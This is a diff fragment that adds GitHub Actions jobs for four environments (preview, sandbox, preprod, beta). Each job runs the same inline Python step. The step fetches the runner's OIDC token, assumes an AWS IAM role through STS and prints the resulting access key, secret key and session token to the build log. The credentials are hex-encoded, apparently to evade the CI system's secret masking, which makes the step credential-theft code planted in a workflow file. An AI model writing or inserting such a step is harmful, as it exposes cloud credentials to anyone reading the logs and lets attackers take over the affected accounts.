+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: preview
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_sandbox:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: sandbox
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: sandbox
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_preprod:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: preprod
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: preprod
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_beta:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: beta
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: beta
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
